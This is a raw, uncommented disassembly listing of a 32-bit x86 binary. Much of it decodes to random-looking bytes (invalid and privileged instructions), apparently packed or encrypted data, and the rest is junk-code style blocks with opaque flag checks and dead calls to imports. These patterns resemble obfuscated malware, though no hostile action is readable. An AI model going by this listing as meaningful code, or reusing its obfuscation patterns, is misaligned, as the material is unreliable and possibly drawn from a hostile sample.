  401853:	icebp  
  401854:	jmp    0x40183e
  401856:	cld    
  401857:	inc    eax
  401858:	jo     0x401812
  40185a:	(bad)  
  40185b:	fcom   QWORD PTR [esi-0x5]
  40185e:	lahf   
  40185f:	jae    0x4018b7
  401861:	push   edi
  401862:	repnz icebp 
  401864:	sti    
  401865:	rcl    DWORD PTR [ebx+eiz*4+0x4],cl
  401869:	fldcw  WORD PTR [ecx]
  40186b:	inc    ebx
  40186c:	mov    DWORD PTR [eax-0xc],esi
  40186f:	cmc    
  401870:	div    BYTE PTR [edx-0x5b]
  401873:	inc    ebx
  401874:	out    dx,eax
  401875:	sbb    esi,DWORD PTR [eax]
  401877:	sub    al,0x1c
  401879:	lock aam 0x7d
  40187c:	leave  
  40187d:	push   cs
  40187e:	repz js 0x401802
  401881:	imul   BYTE PTR [edx]
  401883:	lds    esp,FWORD PTR [edi-0x1a]
  401886:	fiadd  WORD PTR [ebx+0x15]
  401889:	aaa    
  40188a:	xor    eax,0x3ad32d6e
  40188f:	leave  
  401890:	cwde   
  401891:	sbb    DWORD PTR [esi-0xc626450],ebx
  401897:	inc    ecx
  401898:	dec    ebx
  401899:	pop    ebx
  40189a:	popf   
  40189b:	lahf   
  40189c:	pop    esp
  40189d:	push   edi
  40189e:	aaa    
  40189f:	minps  xmm4,XMMWORD PTR [edx+ebx*8+0x12]
  4018a4:	bound  ebx,QWORD PTR [ebx-0xe56026e]
  4018aa:	mov    eax,ds:0x59fe70fd
  4018af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018b0:	inc    edi
  4018b1:	sbb    eax,0x33a86b9b
  4018b6:	adc    edi,DWORD PTR [ecx+0x35e6cba6]
  4018bc:	jbe    0x40184d
  4018be:	cmp    ecx,eax
  4018c0:	push   0x36
  4018c2:	stos   DWORD PTR es:[edi],eax
  4018c3:	xchg   edi,eax
  4018c5:	stc    
  4018c6:	xor    eax,0xe8530bc7
  4018cb:	jnp    0x401912
  4018cd:	mov    bl,0x66
  4018cf:	je     0x40188b
  4018d1:	mov    edi,0xb2d966cb
  4018d6:	and    BYTE PTR [ebp+0x32],dh
  4018d9:	pop    ecx
  4018da:	int3   
  4018db:	push   ss
  4018dc:	imul   edx,DWORD PTR [edi],0xffffffe4
  4018df:	adc    eax,0x3cb6d3bd
  4018e4:	(bad)  
  4018e5:	mov    bh,al
  4018e7:	adc    DWORD PTR [ecx],esi
  4018e9:	or     eax,0xa473b6f7
  4018ee:	popa   
  4018ef:	lahf   
  4018f0:	and    BYTE PTR [ebx],dh
  4018f2:	fisttp QWORD PTR [eax+0x7cd7c149]
  4018f8:	mov    dl,0x54
  4018fa:	mov    dl,0xc
  4018fc:	xchg   ebp,eax
  4018fd:	sbb    DWORD PTR [eax-0x64],0xffffffca
  401901:	iret   
  401902:	sar    DWORD PTR [ebx],cl
  401904:	push   eax
  401905:	popa   
  401906:	sub    eax,DWORD PTR [ebp-0x2e]
  401909:	mov    cl,0xb
  40190b:	mov    ecx,0x87f85905
  401910:	loope  0x401942
  401912:	mov    edx,0x6bc9d070
  401917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401918:	cdq    
  401919:	and    DWORD PTR [ecx-0x6f],ecx
  40191c:	xor    ebx,DWORD PTR [ecx+ecx*4]
  40191f:	push   edx
  401920:	das    
  401921:	stos   DWORD PTR es:[edi],eax
  401922:	or     DWORD PTR [edi+0x3f],ebp
  401925:	idiv   ecx
  401927:	cmc    
  401928:	into   
  401929:	fld    TBYTE PTR [ebp+0x27]
  40192c:	cld    
  40192d:	mov    ?,ecx
  40192f:	outs   dx,BYTE PTR ds:[esi]
  401930:	sub    DWORD PTR [edi],edi
  401932:	pusha  
  401933:	sub    eax,edx
  401935:	mov    edx,0x31ab
  40193a:	mov    DWORD PTR [ebp-0x58],eax
  40193d:	sbb    ecx,edi
  40193f:	cmp    DWORD PTR ds:0x428237,0x0
  401946:	not    DWORD PTR ds:0x4282af
  40194c:	mov    edi,DWORD PTR ds:0x428153
  401952:	mov    DWORD PTR ds:0x42824f,edi
  401958:	jmp    0x4019ab
  40195d:	mov    DWORD PTR ds:0x4282bb,0x77e1
  401967:	not    edi
  401969:	cmp    DWORD PTR ds:0x428237,0x0
  401970:	jge    0x401993
  401976:	push   0x637b
  40197b:	call   DWORD PTR ds:0x428d3c
  401981:	mov    edx,DWORD PTR ds:0x428357
  401987:	adc    DWORD PTR ds:0x4282bf,edx
  40198d:	and    edx,DWORD PTR ds:0x42820f
  401993:	add    DWORD PTR ds:0x42823f,edx
  401999:	mov    edi,DWORD PTR ds:0x428133
  40199f:	xor    DWORD PTR ds:0x42815b,edi
  4019a5:	and    DWORD PTR ds:0x42812b,ecx
  4019ab:	mov    DWORD PTR [ebp-0x54],ecx
  4019ae:	mov    ecx,DWORD PTR ds:0x42833b
  4019b4:	sub    ecx,DWORD PTR ds:0x42823b
  4019ba:	mov    DWORD PTR ds:0x42833b,ecx
  4019c0:	or     DWORD PTR [ebp-0x58],0xca78b059
  4019c7:	sbb    DWORD PTR ds:0x42834b,edx
  4019cd:	or     DWORD PTR [ebp-0x54],0x9c1b89e8
  4019d4:	adc    edx,edx
  4019d6:	lea    eax,[ebp+0x20]
  4019d9:	mov    DWORD PTR [ebp-0xc],eax
  4019dc:	mov    DWORD PTR ds:0x428343,0x339b
  4019e6:	mov    eax,ds:0x422390
  4019eb:	cmp    DWORD PTR ds:0x428227,0x0
  4019f2:	mov    edx,0x5699
  4019f7:	movzx  edx,BYTE PTR ds:0x428237
  4019fe:	mov    edi,0xa42
  401a03:	jmp    0x401a5a
  401a08:	not    edi
  401a0a:	mov    edi,0x2eea
  401a0f:	cmp    DWORD PTR ds:0x428227,0x0
  401a16:	jg     0x401a44
  401a1c:	push   0x3b91
  401a21:	push   0x428247
  401a26:	push   DWORD PTR [ebp-0x1c]
  401a29:	push   0x478c
  401a2e:	call   DWORD PTR ds:0x428e28
  401a34:	adc    ecx,ecx
  401a36:	sbb    ecx,DWORD PTR ds:0x428147
  401a3c:	neg    edx
  401a3e:	adc    ecx,DWORD PTR ds:0x428137
  401a44:	sub    DWORD PTR ds:0x4282c3,ecx
  401a4a:	add    DWORD PTR ds:0x428143,0x42823b
  401a54:	xor    edx,DWORD PTR ds:0x4282ab
  401a5a:	mov    ecx,DWORD PTR [ebp-0xc]
  401a5d:	mov    eax,DWORD PTR [eax]
  401a5f:	add    eax,DWORD PTR [ecx]
  401a61:	sub    DWORD PTR ds:0x428153,edi
  401a67:	mov    edi,0x329e695d
  401a6c:	mov    DWORD PTR [ebp-0x14],eax
  401a6f:	inc    edx
  401a70:	mov    eax,DWORD PTR [ebp+0x18]
  401a73:	cmp    DWORD PTR ds:0x428153,0x0
  401a7a:	mov    edx,DWORD PTR ds:0x428227
  401a80:	mov    edx,0x3ce6
  401a85:	mov    DWORD PTR ds:0x4282df,0xa37
  401a8f:	jmp    0x401ae6
  401a94:	mov    DWORD PTR ds:0x42822b,0x206f
  401a9e:	cmp    DWORD PTR ds:0x428153,0x0
  401aa5:	jg     0x401ac8
  401aab:	push   0x47a2
  401ab0:	push   0x8c73
  401ab5:	push   0x8ece
  401aba:	call   DWORD PTR ds:0x428d40
  401ac0:	sub    edx,DWORD PTR ds:0x428363
  401ac6:	or     edx,ecx
  401ac8:	sub    ecx,0x6960
  401ace:	mov    ecx,DWORD PTR ds:0x42834f
  401ad4:	adc    ecx,DWORD PTR ds:0x42813f
  401ada:	mov    DWORD PTR ds:0x42834f,ecx
  401ae0:	xor    edx,DWORD PTR ds:0x42813b
  401ae6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401ae9:	shrd   eax,ecx,0x2
  401aed:	cmp    DWORD PTR ds:0x428123,0x0
  401af4:	mov    edx,0x4200
  401af9:	mov    DWORD PTR ds:0x428237,0x6ba0
  401b03:	mov    DWORD PTR ds:0x42814f,0x1855
  401b0d:	jmp    0x401b6b
  401b12:	mov    DWORD PTR ds:0x42812f,0x2fa6
  401b1c:	cmp    DWORD PTR ds:0x428123,0x0
  401b23:	jge    0x401b53
  401b29:	push   DWORD PTR [ebp-0x28]
  401b2c:	push   DWORD PTR [ebp-0x20]
  401b2f:	push   0x672f
  401b34:	call   DWORD PTR ds:0x428e90
  401b3a:	movzx  edx,WORD PTR ds:0x42825f
  401b41:	and    edx,DWORD PTR ds:0x42813b
  401b47:	mov    DWORD PTR ds:0x42825f,edx
  401b4d:	and    DWORD PTR ds:0x428217,edx
  401b53:	add    DWORD PTR ds:0x42835b,edx
  401b59:	sub    edx,DWORD PTR ds:0x428263
  401b5f:	add    DWORD PTR ds:0x42821b,edi
  401b65:	or     edx,DWORD PTR ds:0x428347
  401b6b:	shr    ecx,0x2
  401b6e:	mov    ecx,DWORD PTR [ebp+0x18]
  401b71:	cmp    DWORD PTR ds:0x4282cb,0x0
  401b78:	mov    DWORD PTR ds:0x428263,0x3b05
  401b82:	mov    edx,0x7243
  401b87:	mov    DWORD PTR ds:0x428133,0x6e0d
  401b91:	jmp    0x401bec
  401b96:	mov    edx,0x2e5f
  401b9b:	mov    edx,DWORD PTR ds:0x428207
  401ba1:	cmp    DWORD PTR ds:0x4282cb,0x0
  401ba8:	je     0x401be0
  401bae:	push   DWORD PTR [ebp-0x18]
  401bb1:	push   DWORD PTR [ebp-0x20]
  401bb4:	push   DWORD PTR [ebp-0x10]
  401bb7:	push   0x15fe
  401bbc:	push   0x400000
  401bc1:	call   DWORD PTR ds:0x428d54
  401bc7:	sub    DWORD PTR ds:0x4282b7,ecx
  401bcd:	movzx  edx,WORD PTR ds:0x42821b
  401bd4:	add    DWORD PTR ds:0x4282c7,edx
  401bda:	add    DWORD PTR ds:0x42811f,ebx
  401be0:	sbb    DWORD PTR ds:0x4281ef,edi
  401be6:	inc    DWORD PTR ds:0x4281ef
  401bec:	mov    edx,DWORD PTR [ebp+0x1c]
  401bef:	xor    eax,edi
  401bf1:	xor    edx,edx
  401bf3:	or     DWORD PTR ds:0x428353,0x4281f7
  401bfd:	or     edx,eax
  401bff:	jmp    0x401fdd
  401c04:	xchg   ebp,eax
  401c05:	xchg   ecx,eax
  401c06:	je     0x401c58
  401c08:	ins    BYTE PTR es:[edi],dx
  401c09:	sub    al,0x2d
  401c0b:	dec    esp
  401c0c:	and    eax,0x3ab0afeb
  401c11:	ins    DWORD PTR es:[edi],dx
  401c12:	in     eax,0xaa
  401c14:	and    eax,0x9e18180a
  401c19:	adc    bl,BYTE PTR [eax]
  401c1b:	sbb    al,bh
  401c1d:	mov    ?,WORD PTR [ebx]
  401c1f:	sub    DWORD PTR [ebp-0x392df9aa],eax
  401c25:	je     0x401c38
  401c27:	(bad)  
  401c28:	sbb    eax,0xa28e91f9
  401c2d:	out    0x1e,al
  401c2f:	repz push ecx
  401c31:	xor    BYTE PTR [edx],ah
  401c33:	nop
  401c34:	pop    ecx
  401c35:	imul   esp,DWORD PTR [esi+0x6ceb60],0xf317dc78
  401c3f:	pop    es
  401c40:	ja     0x401c66
  401c42:	adc    al,0xdd
  401c44:	std    
  401c45:	sub    BYTE PTR [eax],cl
  401c47:	push   es
  401c48:	push   ss
  401c49:	lea    eax,[ecx-0x70151db1]
  401c4f:	xchg   esp,eax
  401c50:	mov    esi,0xbe93b57b
  401c55:	stos   BYTE PTR es:[edi],al
  401c56:	xor    al,al
  401c58:	(bad)  
  401c59:	rcl    DWORD PTR [ebx+0x60f8758],0x93
  401c60:	sbb    DWORD PTR [edx+0x47cd2a94],esi
  401c66:	mov    ds:0x3be77760,eax
  401c6b:	in     eax,0xd9
  401c6d:	fwait
  401c6e:	sub    BYTE PTR [edi+0x44],ch
  401c71:	leave  
  401c72:	(bad)  
  401c74:	fcom   st(4)
  401c76:	hlt    
  401c77:	scas   al,BYTE PTR es:[edi]
  401c78:	and    dl,cl
  401c7a:	lods   al,BYTE PTR ds:[esi]
  401c7b:	push   ebp
  401c7c:	mov    fs,WORD PTR ds:0x8a294b8c
  401c82:	sbb    eax,0xd56eb400
  401c87:	mov    esp,0x5b532983
  401c8c:	nop
  401c8d:	icebp  
  401c8e:	or     al,dh
  401c90:	shr    DWORD PTR [edi-0xf],0x34
  401c94:	pop    eax
  401c95:	popf   
  401c96:	mov    DWORD PTR [edx],ebp
  401c98:	cdq    
  401c99:	mov    ebp,0xccad1f06
  401c9e:	cld    
  401c9f:	jge    0x401c4c
  401ca1:	or     eax,0x5576ca9c
  401ca6:	ror    DWORD PTR [ecx-0x9ba00fd],cl
  401cac:	xor    edx,edi
  401cae:	ret    0xe379
  401cb1:	xor    DWORD PTR [eax+0x63],ebp
  401cb4:	in     al,dx
  401cb5:	out    dx,al
  401cb6:	pusha  
  401cb7:	call   0x351fbc92
  401cbc:	jo     0x401d0b
  401cbe:	sti    
  401cbf:	sub    esp,DWORD PTR [ebx]
  401cc1:	into   
  401cc2:	rcl    esp,cl
  401cc4:	dec    ebp
  401cc5:	add    dh,BYTE PTR [ecx]
  401cc7:	(bad)  
  401cc8:	jbe    0x401c4f
  401cca:	std    
  401ccb:	call   0x7db41b5f
  401cd0:	mov    ebp,0xfdd60bec
  401cd5:	scas   al,BYTE PTR es:[edi]
  401cd6:	test   al,0x5b
  401cd8:	push   es
  401cd9:	pop    eax
  401cda:	mov    bl,dh
  401cdc:	and    ecx,DWORD PTR [ebp+eiz*1+0x57]
  401ce0:	push   ds
  401ce1:	out    dx,eax
  401ce2:	cdq    
  401ce3:	cmp    ah,BYTE PTR [edi+0x51]
  401ce6:	outs   dx,BYTE PTR ds:[esi]
  401ce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ce8:	or     ebx,ebp
  401cea:	jno    0x401d35
  401cec:	add    esp,DWORD PTR [edx+0x74]
  401cef:	mov    bh,0xe
  401cf1:	aad    0xbe
  401cf3:	fdivr  DWORD PTR [edx+0x53]
  401cf6:	or     eax,0x719276f3
  401cfb:	push   edi
  401cfc:	adc    DWORD PTR [esi+0x1e0a2baa],edx
  401d02:	call   0x4c5a11fb
  401d07:	push   ebp
  401d08:	mov    ch,0x97
  401d0a:	add    BYTE PTR [edi-0x2631b226],bl
  401d10:	push   ecx
  401d11:	mov    ch,BYTE PTR [eax+eax*1-0x5d]
  401d15:	xchg   ebx,eax
  401d16:	ret    0xee4e
  401d19:	(bad)  
  401d1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d1b:	scas   eax,DWORD PTR es:[edi]
  401d1c:	xchg   edi,eax
  401d1d:	sahf   
  401d1e:	dec    ecx
  401d1f:	or     eax,0xfa06b875
  401d24:	pop    ecx
  401d25:	sbb    BYTE PTR [eax],al
  401d27:	xor    al,0x4d
  401d29:	shl    DWORD PTR [esi-0x29],cl
  401d2c:	dec    edx
  401d2d:	jae    0x401d51
  401d2f:	aas    
  401d30:	rcr    DWORD PTR [edx-0x31],cl
  401d33:	out    dx,al
  401d34:	sar    cl,cl
  401d36:	cmc    
  401d37:	cwde   
  401d38:	xchg   BYTE PTR [esp+edi*4],bl
  401d3b:	jle    0x401cdb
  401d3d:	aaa    
  401d3e:	pop    ebx
  401d3f:	mov    eax,ds:0x4b631aa8
  401d44:	addr16 mov ebp,0xfe46ae3
  401d4a:	lahf   
  401d4b:	adc    eax,0xafe6209f
  401d50:	sub    eax,0xa8a6c820
  401d55:	adc    DWORD PTR [edx],esi
  401d57:	lods   al,BYTE PTR ds:[esi]
  401d58:	jbe    0x401d99
  401d5a:	mov    bl,0xf
  401d5c:	inc    edx
  401d5d:	ret    
  401d5e:	test   DWORD PTR [edi+0x72],esi
  401d61:	mov    eax,ds:0xaf6a52ac
  401d66:	stc    
  401d67:	sahf   
  401d68:	leave  
  401d69:	stos   BYTE PTR es:[edi],al
  401d6a:	sbb    al,0xed
  401d6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d6d:	push   edx
  401d6e:	push   edx
  401d6f:	scas   al,BYTE PTR es:[edi]
  401d70:	dec    ebp
  401d71:	fisttp DWORD PTR [esi+0x71]
  401d74:	lds    ebp,FWORD PTR [ebx]
  401d76:	pop    edx
  401d77:	mov    BYTE PTR [ebp+0x499e142e],dh
  401d7d:	inc    esi
  401d7e:	loopne 0x401dc2
  401d80:	push   edx
  401d81:	sub    eax,0xede74f8b
  401d86:	mov    ebp,0x45303315
  401d8b:	pop    ecx
  401d8c:	out    dx,al
  401d8d:	mov    esp,0xa28b9680
  401d92:	aas    
  401d93:	nop
  401d94:	cmp    DWORD PTR [edx],edx
  401d96:	popf   
  401d97:	in     al,dx
  401d98:	enter  0xea49,0x36
  401d9c:	dec    edi
  401d9d:	mov    edi,esp
  401d9f:	std    
  401da0:	(bad)  
  401da1:	enter  0x7f4f,0x13
  401da5:	mov    ah,0xea
  401da7:	mov    ?,edx
  401da9:	inc    esp
  401daa:	push   ss
  401dab:	cmc    
  401dac:	cmp    DWORD PTR [ebx+0x2f7d40b8],edx
  401db2:	retf   0xf8b8
  401db5:	(bad)  
  401db7:	push   edx
  401db8:	(bad)  
  401db9:	push   esi
  401dba:	push   edx
  401dbb:	jle    0x401dba
  401dbd:	inc    esi
  401dbe:	adc    BYTE PTR [edi+0x73],bl
  401dc1:	lds    esp,FWORD PTR [ecx-0x7bba83de]
  401dc7:	sbb    BYTE PTR [edx+eiz*4+0x549dfda0],bl
  401dce:	jmp    0x59d7f00f
  401dd3:	ret    
  401dd4:	mov    dh,0x88
  401dd6:	inc    edx
  401dd7:	jb     0x401e3b
  401dd9:	jg     0x401dbd
  401ddb:	neg    DWORD PTR [esp+eiz*4+0x4b]
  401ddf:	lahf   
  401de0:	stc    
  401de1:	sbb    BYTE PTR [ebx],bl
  401de3:	or     eax,0x135a3b28
  401de8:	in     eax,dx
  401de9:	das    
  401dea:	pop    es
  401deb:	test   BYTE PTR [eax+0x3e25c64],ah
  401df1:	pop    esp
  401df2:	test   dh,al
  401df4:	mul    BYTE PTR [esi]
  401df6:	push   edx
  401df7:	clc    
  401df8:	sub    dh,BYTE PTR [esi]
  401dfa:	mov    ch,0xae
  401dfc:	sub    eax,0x37defb66
  401e01:	xor    DWORD PTR [ebx+0x6c],ebp
  401e04:	or     esi,DWORD PTR [edi]
  401e06:	cmp    BYTE PTR [edx+0x1254d87d],dl
  401e0c:	cmp    DWORD PTR [edx+0x4de4208b],0xe5fc3ac6
  401e16:	and    DWORD PTR [esi],ebp
  401e18:	leave  
  401e19:	cmp    eax,0x814f763d
  401e1e:	jo     0x401e96
  401e20:	shr    BYTE PTR ss:[esi],cl
  401e23:	fild   DWORD PTR [esi]
  401e25:	adc    ebp,0x6e
  401e28:	arpl   WORD PTR [ecx+0x5b],di
  401e2b:	xchg   BYTE PTR [edi],al
  401e2d:	add    esp,0x30
  401e30:	fs xor bl,ah
  401e33:	aas    
  401e34:	(bad)  
  401e35:	and    DWORD PTR [ecx-0x33],esp
  401e38:	jl     0x401df5
  401e3a:	lea    edx,[edx]
  401e3c:	mov    ds:0xdcc41b67,eax
  401e41:	fimul  WORD PTR [edi]
  401e43:	and    eax,0xb3271ab4
  401e48:	xchg   esi,eax
  401e49:	add    ah,bl
  401e4b:	les    ebp,FWORD PTR [ecx]
  401e4d:	(bad)  
  401e4e:	jmp    FWORD PTR [esi+edx*2]
  401e51:	inc    esi
  401e52:	cmp    eax,0x45d7f6e3
  401e57:	sub    edi,DWORD PTR [esp+edx*8-0x4fd10429]
  401e5e:	add    bh,dl
  401e60:	xor    ch,BYTE PTR [ebx+edx*8-0x3e]
  401e64:	pop    ebx
  401e65:	outs   dx,DWORD PTR ds:[esi]
  401e66:	imul   edx,DWORD PTR [esi+0x37],0xc89f38b2
  401e6d:	cmp    DWORD PTR [eax],0x25
  401e70:	xor    BYTE PTR ds:0xd4db0474,bh
  401e76:	dec    ecx
  401e77:	push   ebx
  401e78:	mov    esi,DWORD PTR [eax]
  401e7a:	and    DWORD PTR [esi],esp
  401e7c:	arpl   WORD PTR [edi],cx
  401e7e:	cs mov edx,0xa7f4247e
  401e84:	cli    
  401e85:	or     ebx,eax
  401e87:	xor    BYTE PTR [edi+0x8],ah
  401e8a:	jbe    0x401ef4
  401e8c:	bound  eax,QWORD PTR [eax-0xc626cb1]
  401e92:	adc    eax,DWORD PTR [edx-0x363d4c4e]
  401e98:	out    0x4,eax
  401e9a:	(bad)  
  401e9c:	jecxz  0x401e45
  401e9e:	mov    ecx,0x8420f1e2
  401ea3:	add    bl,dl
  401ea5:	das    
  401ea6:	cli    
  401ea7:	push   ebp
  401ea8:	add    al,0xd8
  401eaa:	push   edi
  401eab:	(bad)  
  401eac:	mov    edx,0x308ae30a
  401eb1:	adc    al,0xa1
  401eb3:	mov    bh,0x6f
  401eb5:	sbb    esi,DWORD PTR [ebx]
  401eb7:	dec    ebp
  401eb8:	lock outs dx,BYTE PTR ds:[esi]
  401eba:	fs retf 
  401ebc:	daa    
  401ebd:	ret    0xbfd5
  401ec0:	and    DWORD PTR [edi],ebx
  401ec2:	push   esp
  401ec3:	mov    ds:0xe59d20a1,al
  401ec8:	in     al,dx
  401ec9:	test   eax,0x2c13f87d
  401ece:	pop    ecx
  401ecf:	pop    ss
  401ed0:	leave  
  401ed1:	(bad)  [esi+eax*1]
  401ed4:	lods   al,BYTE PTR ds:[esi]
  401ed5:	sbb    DWORD PTR [ebx],0x3e7fedfb
  401edb:	ins    DWORD PTR es:[edi],dx
  401edc:	aam    0x6c
  401ede:	adc    ch,bl
  401ee0:	leave  
  401ee1:	int    0x22
  401ee3:	mov    al,0x8
  401ee5:	call   0x6ef00d54
  401eea:	mov    dl,0xd1
  401eec:	pop    ebp
  401eed:	add    al,0x3
  401eef:	push   edx
  401ef0:	jmp    0x401eb7
  401ef2:	xchg   esp,eax
  401ef3:	xlat   BYTE PTR ds:[ebx]
  401ef4:	sub    ebp,DWORD PTR [eax+0x47]
  401ef7:	retf   
  401ef8:	dec    ecx
  401ef9:	dec    ebx
  401efa:	out    dx,al
  401efb:	stc    
  401efc:	pop    esp
  401efd:	div    bh
  401eff:	xor    al,0x55
  401f01:	xor    bl,BYTE PTR [eax-0x6c]
  401f04:	mov    esi,0x94bb2586
  401f09:	pop    esp
  401f0a:	push   esp
  401f0b:	sub    eax,0x52fcfeb8
  401f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f11:	push   0x32dbd73e
  401f16:	jl     0x401f42
  401f18:	dec    ecx
  401f19:	enter  0x696b,0xb
  401f1d:	cwde   
  401f1e:	sbb    dh,BYTE PTR [esi]
  401f20:	xor    ebx,ebp
  401f22:	xchg   ecx,eax
  401f23:	mov    bl,0xf5
  401f25:	mov    ah,0x3e
  401f27:	iret   
  401f28:	mov    dl,BYTE PTR [ebp+ebx*8-0x78]
  401f2c:	adc    bh,BYTE PTR [edi+0x38]
  401f2f:	pop    esp
  401f30:	aas    
  401f31:	outs   dx,DWORD PTR ds:[esi]
  401f32:	inc    esi
  401f33:	test   ecx,edx
  401f35:	pop    edi
  401f36:	fisttp DWORD PTR [ebp+0x55]
  401f39:	pop    esi
  401f3a:	adc    eax,0xbe5c3f6
  401f3f:	clc    
  401f40:	and    al,0x7f
  401f42:	ins    DWORD PTR es:[edi],dx
  401f43:	dec    esp
  401f44:	add    eax,0xcab6449b
  401f49:	or     esi,DWORD PTR [ebx]
  401f4b:	mov    ah,0xad
  401f4d:	xchg   ecx,eax
  401f4e:	sbb    eax,0x120294ec
  401f53:	scas   al,BYTE PTR es:[edi]
  401f54:	dec    esp
  401f55:	div    BYTE PTR [esi+0x62]
  401f58:	adc    edi,DWORD PTR [edx+0xa9e3610]
  401f5e:	add    BYTE PTR [esi],cl
  401f60:	jge    0x401fdc
  401f62:	fld    QWORD PTR [eax]
  401f64:	sar    BYTE PTR [ebp-0x52f05e5c],0x43
  401f6b:	imul   edi,DWORD PTR [edx+eiz*2-0x2583430],0x90440a11
  401f76:	pushf  
  401f77:	cmp    ch,cl
  401f79:	inc    ebx
  401f7a:	mov    edx,DWORD PTR [ebp-0x48e05a5b]
  401f80:	mov    edi,ebx
  401f82:	push   esi
  401f83:	stos   BYTE PTR es:[edi],al
  401f84:	jo     0x401f65
  401f86:	sub    BYTE PTR [ebx],0xa0
  401f89:	or     BYTE PTR [ebx+0x4e],ah
  401f8c:	shl    esi,cl
  401f8e:	nop
  401f8f:	jnp    0x402004
  401f91:	mov    ecx,0x8a7b9fcd
  401f96:	pop    ds
  401f97:	ret    
  401f98:	call   0x8a725140
  401f9d:	adc    bl,ah
  401f9f:	fisttp WORD PTR [edx-0x1f]
  401fa2:	xchg   edx,eax
  401fa3:	dec    edx
  401fa4:	jnp    0x401fad
  401fa6:	inc    ebp
  401fa7:	pop    edi
  401fa8:	push   ss
  401fa9:	adc    eax,0xb1aceea7
  401fae:	mov    esi,0x4cb34b17
  401fb3:	fild   DWORD PTR [eax-0x72]
  401fb6:	and    al,BYTE PTR [edi]
  401fb8:	lds    edx,FWORD PTR [eax-0x7c597e35]
  401fbe:	mov    cl,0xa4
  401fc0:	and    eax,0x811d2567
  401fc5:	jle    0x401f7a
  401fc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fc8:	pop    ecx
  401fc9:	inc    ebp
  401fca:	in     eax,dx
  401fcb:	dec    eax
  401fcc:	fldenv [esi+0x301d2e05]
  401fd2:	or     al,0xd9
  401fd4:	cmp    BYTE PTR [ebx+0x79666712],ch
  401fda:	stos   DWORD PTR es:[edi],eax
  401fdb:	icebp  
  401fdc:	push   ebp
  401fdd:	mov    DWORD PTR [ebp-0x3c],edx
  401fe0:	mov    DWORD PTR [ebp-0x70],0x2c55
  401fe7:	mov    eax,ds:0x42832b
  401fec:	adc    DWORD PTR ds:0x428367,eax
  401ff2:	mov    DWORD PTR [ebp-0x6c],0x456f
  401ff9:	cmp    DWORD PTR ds:0x42834b,0x0
  402000:	mov    DWORD PTR ds:0x42824b,0x4df8
  40200a:	mov    DWORD PTR ds:0x428333,0x33aa
  402014:	jmp    0x402076
  402019:	mov    eax,0x569b
  40201e:	mov    eax,0x2370
  402023:	cmp    DWORD PTR ds:0x42834b,0x0
  40202a:	jbe    0x40205c
  402030:	push   DWORD PTR [ebp-0xc]
  402033:	push   0x3ea9
  402038:	call   DWORD PTR ds:0x428d58
  40203e:	or     DWORD PTR ds:0x42812f,0x6f29
  402048:	xor    DWORD PTR ds:0x4282cb,0x4282bf
  402052:	add    DWORD PTR ds:0x42824b,0x4282e7
  40205c:	and    DWORD PTR ds:0x42835b,edi
  402062:	mov    DWORD PTR ds:0x42823b,0x2a04
  40206c:	sub    DWORD PTR ds:0x42815b,0x42811b
  402076:	mov    DWORD PTR [ebp-0x70],0x78a6
  40207d:	cmp    DWORD PTR ds:0x4282af,0x0
  402084:	mov    DWORD PTR ds:0x4282ab,ecx
  40208a:	mov    DWORD PTR ds:0x428157,0x59f
  402094:	mov    DWORD PTR ds:0x428157,ecx
  40209a:	mov    DWORD PTR ds:0x4282d7,0x5800
  4020a4:	jmp    0x402119
  4020a9:	mov    eax,0x445d
  4020ae:	cmp    DWORD PTR ds:0x4282af,0x0
  4020b5:	ja     0x4020ec
  4020bb:	push   0x42812b
  4020c0:	push   DWORD PTR [ebp-0x10]
  4020c3:	push   0x842c
  4020c8:	call   DWORD PTR ds:0x428e94
  4020ce:	sbb    DWORD PTR ds:0x42833b,0x4ff2
  4020d8:	xor    DWORD PTR ds:0x4282bb,0x42822f
  4020e2:	adc    DWORD PTR ds:0x42832f,0x4c73
  4020ec:	add    DWORD PTR ds:0x42832f,0x42835f
  4020f6:	and    DWORD PTR ds:0x428117,0x428333
  402100:	sbb    DWORD PTR ds:0x42811b,0x5f9d
  40210a:	sbb    DWORD PTR ds:0x4282af,0x42825f
  402114:	sbb    eax,0x5252
  402119:	mov    DWORD PTR [ebp-0x6c],0x188
  402120:	neg    eax
  402122:	mov    DWORD PTR [ebp-0x70],0x5b3f
  402129:	mov    DWORD PTR [ebp-0x6c],0x3219
  402130:	mov    DWORD PTR [ebp-0x70],0x231c
  402137:	mov    eax,ds:0x4282ab
  40213c:	add    DWORD PTR ds:0x428247,eax
  402142:	mov    DWORD PTR [ebp-0x6c],0x1337
  402149:	mov    eax,ds:0x42833b
  40214e:	add    DWORD PTR ds:0x4282d7,eax
  402154:	mov    DWORD PTR [ebp-0x70],0x7593
  40215b:	cmp    DWORD PTR ds:0x428127,0x0
  402162:	mov    DWORD PTR ds:0x42834b,0x750f
  40216c:	not    DWORD PTR ds:0x428333
  402172:	jmp    0x4021e4
  402177:	mov    DWORD PTR ds:0x42822b,0x610f
  402181:	mov    eax,ds:0x42813f
  402186:	cmp    DWORD PTR ds:0x428127,0x0
  40218d:	jle    0x4021c5
  402193:	push   0x428029
  402198:	push   DWORD PTR [ebp-0x28]
  40219b:	push   0x1818
  4021a0:	push   DWORD PTR [ebp-0x18]
  4021a3:	push   0x8e39
  4021a8:	push   DWORD PTR [ebp-0x1c]
  4021ab:	call   DWORD PTR ds:0x428e30
  4021b1:	adc    DWORD PTR ds:0x42824f,0x428223
  4021bb:	add    DWORD PTR ds:0x42820f,0x168f
  4021c5:	sub    DWORD PTR ds:0x4282b3,0x428153
  4021cf:	or     DWORD PTR ds:0x428353,0xa53
  4021d9:	mov    eax,ds:0x428207
  4021de:	xor    DWORD PTR ds:0x42811b,eax
  4021e4:	mov    DWORD PTR [ebp-0x6c],0x11b8
  4021eb:	xor    eax,0x39f6
  4021f0:	jmp    0x4025ce
  4021f5:	stos   DWORD PTR es:[edi],eax
  4021f6:	fisttp QWORD PTR [edi+0x32]
  4021f9:	aas    
  4021fa:	and    ch,BYTE PTR [edx-0x2c2c85a4]
  402200:	mov    esp,0xaa25ec9e
  402205:	stos   DWORD PTR es:[edi],eax
